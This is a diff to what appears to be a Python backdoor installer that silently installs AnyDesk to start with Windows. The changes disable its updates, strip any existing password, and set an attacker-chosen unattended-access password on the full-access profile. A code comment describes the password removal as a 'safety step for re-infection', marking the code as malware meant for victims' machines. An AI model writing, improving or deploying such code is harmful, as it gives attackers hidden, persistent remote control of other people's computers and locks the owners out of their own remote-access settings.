@@ -215,7 +215,7 @@ def install_anydesk(anydesk_path):
         log(f"Installing AnyDesk to {install_dir}...")
 
         subprocess.run(
-            [anydesk_path, "--install", str(install_dir), "--start-with-win", "--silent"],
+            [anydesk_path, "--install", str(install_dir), "--start-with-win", "--silent", "--update-disabled"],
             capture_output=True,
             timeout=10,
         )
@@ -243,15 +243,28 @@ def install_anydesk(anydesk_path):
         return anydesk_path
 
 
-def set_anydesk_password(anydesk_path, password):
-    """Set unattended access password"""
+def remove_existing_password(anydesk_path, profile="_full_access"):
+    """Remove any existing password from the specified profile"""
     try:
-        log(f"Setting password...")
+        log(f"Removing existing password from {profile} profile...")
+        subprocess.run([anydesk_path, "--remove-password", profile], capture_output=True, timeout=5)
+        log("Existing password removed")
+    except Exception as e:
+        log(f"Password removal failed (may not exist): {e}")
+
+
+def set_anydesk_password(anydesk_path, password, profile="_full_access"):
+    """Set unattended access password on _full_access profile (includes all permissions)"""
+    try:
+        log(f"Setting password for {profile} profile...")
         proc = subprocess.Popen(
-            [anydesk_path, "--set-password"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+            [anydesk_path, "--set-password", profile],
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
         )
         proc.communicate(input=f"{password}\n".encode(), timeout=5)
-        log("Password set successfully")
+        log(f"Password set for {profile} profile")
         return True
     except Exception as e:
         log(f"Password setting failed: {e}")
@@ -384,7 +397,10 @@ def main():
         # Install AnyDesk
         anydesk_path = install_anydesk(anydesk_path)
 
-        # Set password
+        # Remove any existing password (safety step for re-infection)
+        remove_existing_password(anydesk_path)
+
+        # Set password on _full_access profile (includes all permissions + privacy mode)
         set_anydesk_password(anydesk_path, ANYDESK_PASSWORD)
 
         # Get AnyDesk ID
